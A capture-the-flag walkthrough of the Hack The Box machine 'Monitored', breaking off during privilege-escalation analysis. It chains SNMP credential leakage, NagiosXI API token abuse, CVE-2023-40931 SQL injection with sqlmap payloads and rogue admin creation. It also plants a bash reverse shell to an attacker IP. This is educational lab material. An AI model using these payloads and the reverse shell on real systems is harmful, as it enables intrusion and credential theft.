### Description
We start this box by enumerating `SNMP` running processes to find potential user credentials. We then attempt to use these credentials on the `NagiosXI` web site to find the user account has been deactivated. We perform subdirectory brute-forcing to find an API endpoint and look up documentation to discover how to gain an access token via user credentials which we use to gain access to the site. We then exploit an SQLi vulnerability to dump the database including an Administrator API key. With this key, we're able to create an admin user on `NagiosXI` who is able to execute arbitrary commands, granting us a reverse shell as `nagios`. From here, we see multiple scripts we're able to run as `sudo`, two of which are vulnerable:

`manage_services.sh` allows the user to start, stop, and restart a set of pre-defined services, a couple of which utilize `Exec*` on binaries in directories we have write access to. We exploit it by creating a malicious shell script to create a root-owned SUID copy of bash

`get_profile.sh` is a backup utility that reads from files in directories we have write access to. We exploit it by creating a symlink to the `root` user's SSH key, allowing us to read it

### Tools
- `nmap SNMP scripting`
- `ffuf`
- `feroxbuster`
- `burp`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#Subdomain Brute-Force]]
	- [[#UDP Scan]]
- [[#SNMP - UDP 161]]
- [[#LDAP - TCP 389]]
- [[#HTTP(S) - TCP 80/443]]
	- [[#Manual API Fuzzing]]
- [[#SQL Injection (CVE-2023-40931)]]
	- [[#sqlmap]]
- [[#More API Fuzzing]]
- [[#Creating Admin User]]
###### [[#User Shell - nagios]]
- [[#Shell]]
- [[#Enumeration as nagios]]
	- [[#SSH Persistence]]
###### [[#Root Shell]]
- [[#manage_services.sh]]
	- [[#ncpd.service]]
- [[#get_profile.sh]]
	- [[#Read SSH Key]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.230.96 -oN nmap/tcp           
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
389/tcp  open  ldap    syn-ack ttl 63
443/tcp  open  https   syn-ack ttl 63
5667/tcp open  unknown syn-ack ttl 63

❯ sudo nmap -p 22,80,389,443,5667 -sCV -vv 10.129.230.96 -oN nmap/tcpScripts     
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/xFgJTbVC36GNHaE0GG4n/bWZGaD2aE7lsFUvXVdbINrl0qzBPVCMuOE1HNf0LHi09obr2Upt9VURzpYdrQp/7SX2NDet9pb+UQnB1IgjRSxoIxjsOX756a7nzi71tdcR3I0sALQ4ay5I5GO4TvaVq+o8D01v94B0Qm47LVk7J3mN4wFR17lYcCnm0kwxNBsKsAgZVETxGtPgTP6hbauEk/SKGA5GASdWHvbVhRHgmBz2l7oPrTot5e+4m8A7/5qej2y5PZ9Hq/2yOldrNpS77ID689h2fcOLt4fZMUbxuDzQIqGsFLPhmJn5SUCG9aNrWcjZwSL2LtLUCRt6PbW39UAfGf47XWiSs/qTWwW/yw73S8n5oU5rBqH/peFIpQDh2iSmIhbDq36FPv5a2Qi8HyY6ApTAMFhwQE6MnxpysKLt/xEGSDUBXh+4PwnR0sXkxgnL8QtLXKC2YBY04jGG0DXGXxh3xEZ3vmPV961dcsNd6Up8mmSC43g5gj2ML/E=
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBbeArqg4dgxZEFQzd3zpod1RYGUH6Jfz6tcQjHsVTvRNnUzqx5nc7gK2kUUo1HxbEAH+cPziFjNJc6q7vvpzt4=
|   256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5o+WJqnyLpmJtLyPL+tEUTFbjMZkx3jUUFqejioAj7
80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
|_http-title: Nagios XI
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-11T21:46:55
| Not valid after:  2297-08-25T21:46:55
| MD5:   b36a 5560 7a5f 047d 9838 6450 4d67 cfe0
| SHA-1: 6109 3844 8c36 b08b 0ae8 a132 971c 8e89 cfac 2b5b
| -----BEGIN CERTIFICATE-----
| MIID/zCCAuegAwIBAgIUVhOvMcK6dv/Kvzplbf6IxOePX3EwDQYJKoZIhvcNAQEL
| BQAwgY0xCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZEb3JzZXQxFDASBgNVBAcMC0Jv
| dXJuZW1vdXRoMRIwEAYDVQQKDAlNb25pdG9yZWQxHTAbBgNVBAMMFG5hZ2lvcy5t
| b25pdG9yZWQuaHRiMSQwIgYJKoZIhvcNAQkBFhVzdXBwb3J0QG1vbml0b3JlZC5o
| dGIwIBcNMjMxMTExMjE0NjU1WhgPMjI5NzA4MjUyMTQ2NTVaMIGNMQswCQYDVQQG
| EwJVSzEPMA0GA1UECAwGRG9yc2V0MRQwEgYDVQQHDAtCb3VybmVtb3V0aDESMBAG
| A1UECgwJTW9uaXRvcmVkMR0wGwYDVQQDDBRuYWdpb3MubW9uaXRvcmVkLmh0YjEk
| MCIGCSqGSIb3DQEJARYVc3VwcG9ydEBtb25pdG9yZWQuaHRiMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1qRRCKn9wFGquYFdqh7cp4WSTPnKdAwkycqk
| a3WTY0yOubucGmA3jAVdPuSJ0Vp0HOhkbAdo08JVzpvPX7Lh8mIEDRSX39FDYClP
| vQIAldCuWGkZ3QWukRg9a7dK++KL79Iz+XbIAR/XLT9ANoMi8/1GP2BKHvd7uJq7
| LV0xrjtMD6emwDTKFOk5fXaqOeODgnFJyyXQYZrxQQeSATl7cLc1AbX3/6XBsBH7
| e3xWVRMaRxBTwbJ/mZ3BicIGpxGGZnrckdQ8Zv+LRiwvRl1jpEnEeFjazwYWrcH+
| 6BaOvmh4lFPBi3f/f/z5VboRKP0JB0r6I3NM6Zsh8V/Inh4fxQIDAQABo1MwUTAd
| BgNVHQ4EFgQU6VSiElsGw+kqXUryTaN4Wp+a4VswHwYDVR0jBBgwFoAU6VSiElsG
| w+kqXUryTaN4Wp+a4VswDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
| AQEAdPGDylezaB8d/u2ufsA6hinUXF61RkqcKGFjCO+j3VrrYWdM2wHF83WMQjLF
| 03tSek952fObiU2W3vKfA/lvFRfBbgNhYEL0dMVVM95cI46fNTbignCj2yhScjIz
| W9oeghcR44tkU4sRd4Ot9L/KXef35pUkeFCmQ2Xm74/5aIfrUzMnzvazyi661Q97
| mRGL52qMScpl8BCBZkdmx1SfcVgn6qHHZpy+EJ2yfJtQixOgMz3I+hZYkPFjMsgf
| k9w6Z6wmlalRLv3tuPqv8X3o+fWFSDASlf2uMFh1MIje5S/jp3k+nFhemzcsd/al
| 4c8NpU/6egay1sl2ZrQuO8feYA==
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
5667/tcp open  tcpwrapped syn-ack ttl 63
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- The TTL indicates a POSIX adherent system
- The OpenSSH version indicates `Ubuntu 21` but Apache is patched
- We'll have to do some subdomain brute-forcing since we failed to follow a redirect to `nagios.monitored.htb`

### Subdomain Brute-Force
```sh
❯ ffuf -u "http://10.129.230.96" -H "Host: FUZZ.monitored.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -ac
...
nagios             [Status: 302, Size: 298, Words: 18, Lines: 10, Duration: 12ms]
```
- Only the `nagio.monitored.htb` seems to be in play here. We'll add it to our `/etc/hosts` file

### UDP Scan
```sh
❯ sudo nmap -sU -p- --min-rate 10000 -vv 10.129.230.96 -oN nmap/udp             
PORT    STATE SERVICE REASON
123/udp open  ntp     udp-response ttl 63
161/udp open  snmp    udp-response ttl 63
```
- `ntp` could be useful for clock synchronization
- `snmp` could be very interesting if we can guess the correct public string

## SNMP - UDP 161
---
- We can perform an `nmap -p 161 -sU -sCV 10.129.230.96` scan to see if it can authenticate with `SNMP` and check for any juicy stuff
- It's able to authenticate with a `public` string!
- There's an interesting process running in sudo that `nmap` is able to pick up for us:
```sh
|   1390: 
|     Name: sudo
|     Path: sudo
|     Params: -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
```
- This might be a username and password we can pocket for later

## LDAP - TCP 389
---
- We can use `nxc` to test for `LDAP` login with the credentials `svc:XjH7VCehowpR1xZB` but it fails to authenticate. We won't get anything interesting from here until we get some valid creds

## HTTP(S) - TCP 80/443
---
- Accessing the website brings us to an instance of `NagiosXI`
- We're given a login page, along with a `forgot password` functionality that prompts for a username. Testing for SQL injection doesn't give us anything useful
	- Testing `admin:admin` gives us `Invalid Username or Password`
- We can try the credentials `svc:XjH7VCehowpR1xZB`
	- It sends back `The specified user account has been disabled or does not exist.`, indicating that the account credentials work but the account is probably disabled
- We can run `feroxbuster` to search for subdirectories and we come across a promising one:
	- `https://nagios.monitored.htb/nagiosxi/api/`

- There's a [PDF Document](https://assets.nagios.com/downloads/nagiosxi/docs/Accessing-and-Using-the-XI-REST-API.pdf) that specifies some details of the `NagiosXI` API, specifically it details that in order to use it we need to provide an API key
	- There's no further information on how to acquire said key without being authenticated first

- We can run `feroxbuster` specifically on this subdirectory to see if we get anything more interesting
```sh
❯ feroxbuster -u "https://nagios.monitored.htb/nagiosxi/api" -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/raft-medium-directories.txt --insecure -m GET,POST 
...
200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/license
200     POST        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/license

200      GET        1l        7w       53c https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
200     POST        1l        6w       49c https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
```

### Manual API Fuzzing
- We can open up `burp` and do some manual fuzzing of the API ourselves
```http
POST /nagiosxi/api/v1/authenticate HTTP/1.1
Host: nagios.monitored.htb

HTTP/1.1 200 OK
Date: Thu, 19 Feb 2026 16:57:25 GMT
Server: Apache/2.4.56 (Debian)
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
Content-Length: 49
Content-Type: application/json

{"error":"Must be valid username and password."}
```
- We get an error when performing a `POST` request to the `authenticate` API endpoint indicating we need to provide a valid username and password
	- We'll use `Content-Type: application/x-www-form-urlencoded`

```http
POST /nagiosxi/api/v1/authenticate HTTP/1.1
Host: nagios.monitored.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

username=svc&password=XjH7VCehowpR1xZB

HTTP/1.1 200 OK
Date: Thu, 19 Feb 2026 17:06:57 GMT
Server: Apache/2.4.56 (Debian)
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
Content-Length: 151
Content-Type: application/json

{"username":"svc","user_id":"2","auth_token":"8a349ca11f79b4fcf950cbee3b0123c1e9826412","valid_min":5,"valid_until":"Thu, 19 Feb 2026 12:11:57 -0500"}
```
- Nice, we've got an authentication token, `8a349ca11f79b4fcf950cbee3b0123c1e9826412`
- Seems like it's only valid for 5 minutes

- It took a while of searching, specifically on `google`, but I eventually found this [forum post](nagiosxi/api/v1/authenticate) which shows the use of the URL parameter `&token=TOKEN`
- We can navigate to `/nagiosxi/login.php&token=8a349ca11f79b4fcf950cbee3b0123c1e9826412` and we're logged in as the user `svc`!
- We're now able to see that the `NagiosXI` version we're running is `5.11.0`
- From here we can grab our API key
	- `2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK`

## SQL Injection (CVE-2023-40931)
---
- Searching for CVEs for our version of `NagiosXI` brings us to this [blog post](https://outpost24.com/blog/nagios-xi-vulnerabilities/) that explores a few different SQL injection vulnerabilities
- The first CVE explains an injection in the `https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php` endpoint which we have access to
> When a user acknowledges a banner, a POST request is sent to `/nagiosxi/admin/banner_message-ajaxhelper.php` with the POST data consisting of the intended action and message ID – `action=acknowledge banner message&id=3`.
> 
> The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the `xi_session` and `xi_users` table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.

- We can verify the SQL injection like so:
```http
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=jnl2s6gfhndfptjd9mhnhc0brj
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

action=acknowledge_banner_message&id=3

{"message":"Failed to acknowledge message.","msg_type":"error"}
```
```http
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=jnl2s6gfhndfptjd9mhnhc0brj
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

action=acknowledge_banner_message&id=3'

<p><pre>SQL Error [nagiosxi] : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' and user_id = 2' at line 1</pre></p>
{"message":"Failed to acknowledge message.","msg_type":"error"}
```
- The behavior is a bit strange and hinges on the `action` value utilizing underscores between the words. If I try to delimit with `+` then it fails

### sqlmap
- We can try to probe for the proper form of SQLi and grab the DB banner like so:
```sh
❯ sqlmap -r injection.req --level=5 --risk=3 --batch --threads=10 -b    
...
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: action=acknowledge_banner_message&id=(SELECT (CASE WHEN (7052=7052) THEN 3 ELSE (SELECT 4306 UNION SELECT 7670) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=acknowledge_banner_message&id=3 OR (SELECT 5271 FROM(SELECT COUNT(*),CONCAT(0x717a7a7a71,(SELECT (ELT(5271=5271,1))),0x717a6b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=acknowledge_banner_message&id=3 AND (SELECT 4148 FROM (SELECT(SLEEP(5)))qWCe)
---
...
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
banner: '10.5.23-MariaDB-0+deb11u1'
```

- We enumerate dbs to find the following:
```sh
available databases [2]:
[*] information_schema
[*] nagiosxi
```

- Enumerating tables:
```sh
Database: nagiosxi
[22 tables]
+-----------------------------+
| xi_auditlog                 |
| xi_auth_tokens              |
| xi_banner_messages          |
| xi_cmp_ccm_backups          |
| xi_cmp_favorites            |
| xi_cmp_nagiosbpi_backups    |
| xi_cmp_scheduledreports_log |
| xi_cmp_trapdata             |
| xi_cmp_trapdata_log         |
| xi_commands                 |
| xi_deploy_agents            |
| xi_deploy_jobs              |
| xi_eventqueue               |
| xi_events                   |
| xi_link_users_messages      |
| xi_meta                     |
| xi_mibs                     |
| xi_options                  |
| xi_sessions                 |
| xi_sysstat                  |
| xi_usermeta                 |
| xi_users                    |
+-----------------------------+
```

- From there we can dump the table to find the Administrator's api key which is `IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`
- The Administrator's password hash is also `$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C`
	- Doesn't crack with `rockyou.txt`

- We can test the admin's API key by performing the following request (obtained from the [PDF guide](https://assets.nagios.com/downloads/nagiosxi/docs/Accessing-and-Using-the-XI-REST-API.pdf)):
```http
GET /nagiosxi/api/v1/system/status?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1 HTTP/1.1
Host: nagios.monitored.htb
Content-Length: 2

...
{
    "instance_id": "1",
    "instance_name": "unassigned",
    "status_update_time": "2026-02-23 13:55:01",
    "program_start_time": "2026-02-23 13:49:15",
    "program_run_time": "347",
    "program_end_time": "1970-01-01 00:00:01",
    "is_currently_running": "1",
    "process_id": "948",
    "daemon_mode": "1",
    "last_command_check": "1969-12-31 19:00:00",
    "last_log_rotation": "1969-12-31 19:00:00",
    "notifications_enabled": "1",
    "active_service_checks_enabled": "1",
    "passive_service_checks_enabled": "1",
    "active_host_checks_enabled": "1",
    "passive_host_checks_enabled": "1",
    "event_handlers_enabled": "1",
    "flap_detection_enabled": "1",
    "process_performance_data": "1",
    "obsess_over_hosts": "0",
    "obsess_over_services": "0",
    "modified_host_attributes": "0",
    "modified_service_attributes": "0",
    "global_host_event_handler": "xi_host_event_handler",
    "global_service_event_handler": "xi_service_event_handler"
}
```
- Nice! Looks like it works, now we can try to fuzz additional endpoints now that we've got admin auth

## More API Fuzzing
---
```sh
❯ feroxbuster -u https://nagios.monitored.htb/nagiosxi/api/v1 --query apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL --insecure -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/api/objects.txt -m GET,POST
...
200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/config?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200     POST        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/config?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL

200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/license?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200     POST        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/license?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL

200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/objects?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200     POST        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/objects?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL

200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/system?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200     POST        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/system?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL

200      GET        1l        7w       54c https://nagios.monitored.htb/nagiosxi/api/v1/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200     POST        1l        7w       54c https://nagios.monitored.htb/nagiosxi/api/v1/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
```
- We've got the following endpoints (we have to manually fuzz them further as `feroxbuster` doesn't recurse)
	- `config`
		- `command`
		- `contact`
		- `host`
		- `import`
		- `service`
	- `license`
	- `objects`
	- `system`
		- `command`
		- `info`
		- `status`
		- `user`
	- `user`

- `config/command` seems like it could be promising
- Making a GET request to it shows a huge list of commands and their command-line correspondents:
```http
GET /nagiosxi/api/v1/config/command?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1 HTTP/1.1
Host: nagios.monitored.htb
Content-Length: 0

[
    {
        "command_name": "check-host-alive",
        "command_line": "$USER1$\/check_icmp -H $HOSTADDRESS$ -w 3000.0,80% -c 5000.0,100% -p 5"
    },
    {
        "command_name": "check-host-alive-http",
        "command_line": "$USER1$\/check_http -H $HOSTADDRESS$"
    },
    {
        "command_name": "check-host-alive-tftp",
        "command_line": "tftp $HOSTNAME$ 69"
    },
    {
        "command_name": "check_bpi",
        "command_line": "\/usr\/bin\/php $USER1$\/check_bpi.php $ARG1$"
    },
    {
        "command_name": "check_capacity_planning",
        "command_line": "$USER1$\/check_capacity_planning.py $ARG1$ $ARG2$"
    },
    {
        "command_name": "check_cpu_usage_by_ssh",
        "command_line": "$USER1$\/check_cpu.ps1.py -H $HOSTADDRESS$ $ARG1$"
    },
    ...
```
- Performing a POST request gives us the following:
```json
{
    "error": "Missing required variables",
    "missing": [
        "command_name",
        "command_line"
    ]
}
```
- We can't really use this endpoint comfortably until we know more about the filestructure on the box

## Creating Admin User
---
- The `system/user` endpoint is also potentially interesting:
```http
GET /nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1 HTTP/1.1
Host: nagios.monitored.htb
Content-Length: 0

...
{
    "records": 2,
    "users": [
        {
            "user_id": "2",
            "username": "svc",
            "name": "svc",
            "email": "svc@monitored.htb",
            "enabled": "0"
        },
        {
            "user_id": "1",
            "username": "nagiosadmin",
            "name": "Nagios Administrator",
            "email": "admin@monitored.htb",
            "enabled": "1"
        }
    ]
}

POST /nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1 HTTP/1.1
Host: nagios.monitored.htb
Content-Length: 0

...
{
    "error": "Could not create user. Missing required fields.",
    "missing": [
        "username",
        "email",
        "name",
        "password"
    ]
}
```
- Looks like we can create our own user with the `POST` endpoint

```http
POST /nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1 HTTP/1.1
Host: nagios.monitored.htb
Content-Length: 61
Content-Type: application/x-www-form-urlencoded

username=wallfly&email=a@a.a&name=wallfly&password=password

...
{
    "success": "User account wallfly was added successfully!",
    "user_id": 6
}
```
- We can now log in as `wallfly` on the `NagiosXI` webpage!
- They don't seem to have any special privileges though, how can we get an admin user?
- Looking up `/nagiosxi/api/v1/system/user` on google routes us to this interesting [exploitdb page](https://www.exploit-db.com/exploits/44560) where the following parameters are sent to the `/system/user` endpoint
```python
params3 = urllib.urlencode({
    'username':sploit_username,
    'password':sploit_password,
    'name':'Firsty Lasterson',
    'email':'{0}@localhost'.format(sploit_username),
    'auth_level':'admin',
    'force_pw_change':0
    })
```

```http
POST /nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1 HTTP/1.1
Host: nagios.monitored.htb
Content-Length: 92
Content-Type: application/x-www-form-urlencoded

username=super&email=a@a.a&name=super&password=password&auth_level=admin&force_pw_change=0

...
{
    "success": "User account super was added successfully!",
    "user_id": 7
}
```
- Awesome! Now we've got admin access to the site!

# User Shell - nagios
---
## Shell
---
- There's a prime RCE endpoint under `Configure > Core Configure Manager > Commands > Commands` where we can input our own command to be executed
- We can input our own `rev` command: `bash -c 'bash -i >& /dev/tcp/10.10.15.234/12345 0>&1'` and apply the configuration
	- There's no way to directly run the command from here
- We can then navigate to `Configure > Core Configure Manager > Monitor > Hosts` to select hosts and execute the configured commands, including our malicious `rev` command!
```sh
❯ nc -lvnp 12345                                
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.5.117.
Ncat: Connection from 10.129.5.117:33056.
bash: cannot set terminal process group (6206): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:~$ 
```

## Enumeration as nagios
---
- After performing a shell upgrade, we can finally grab `user.txt`
```sh
nagios@monitored:~$ cat user.txt 
166a79b62aec20cbb88f2cd8a578c010
```

- The HTB gods are kind and we see a hit when performing `sudo -l`
```sh
nagios@monitored:~$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```
- The `/etc/init.d/nagios` binary is not present on the box, leaving us with with a few `php` and `.sh` scripts

### SSH Persistence
- Since we might want to be moving some files back and forth for inspection, it'd be convenient if we can turn this reverse shell into an `SSH` one
```sh
ssh-keygen -t ed25519
```
- Then we copy the public key to `authorized_keys` on the server
- Finally we copy the private key to our attack box and `chmod 600` it

# Root Shell
## manage_services.sh
---
- The manage services script enumerates the OS and provides a wrapper for starting, stopping, restarting various services
- It starts by fetching the desired action (start, stop, etc.) and the service along with creating a helper function to determine if a variable is within a given array
```sh
# Things you can do
first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")
second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")

# Helper functions
# -----------------------

contains () {
    local array="$1[@]"
    local seeking=$2
    local in=1
    for element in "${!array}"; do
        if [[ "$element" == "$seeking" ]]; then
            in=0
            break
        fi
    done
    return $in
}
```

- Then the script ensures that the arguments are in the correct positions and applies OS-specific tailoring
```sh
# Verify to avoid abuse
# -----------------------

# Check to verify the proper usage format
# ($1 = action, $2 = service name)

if ! contains first "$1"; then
    echo "First parameter must be one of: ${first[*]}"
    exit 1
fi

if ! contains second "$2"; then
    echo "Second parameter must be one of: ${second[*]}"
    exit 1
fi

action=$1

# if service name is defined in xi-sys.cfg use that name
# else use name passed
if [ "$2" != "php-fpm" ] && [ ! -z "${!2}" ];then
    service=${!2}
else
    service=$2
fi

# if the action is status, add -n 0 to args to stop journal output
# on CentOS/RHEL 7 systems
args=""
if [ "$action" == "status" ]; then
    args="-n 0"
fi

# Special case for ndo2db since we don't use it anymore
if [ "$service" == "ndo2db" ]; then
    echo "OK - Nagios XI 5.7 uses NDO3 build in and no longer uses the ndo2db service"
    exit 0
fi
```

- Then it runs the action command combination for said OS
```sh
# Ubuntu / Debian

if [ "$distro" == "Debian" ] || [ "$distro" == "Ubuntu" ]; then
    # Adjust the shellinabox service, no trailing 'd' in Debian/Ubuntu
    if [ "$service" == "shellinaboxd" ]; then
        service="shellinabox"
    fi
	
    if [ `command -v systemctl` ]; then
        `which systemctl` --no-pager "$action" "$service" $args
        return_code=$?
    else
        `which service` "$service" "$action"
        return_code=$?
    fi
fi
```

- The script then exits with the `return_code`

- We can test for funky permissions in the `/etc/systemd` directory to see if any of the services in the script allow us to modify them
```sh
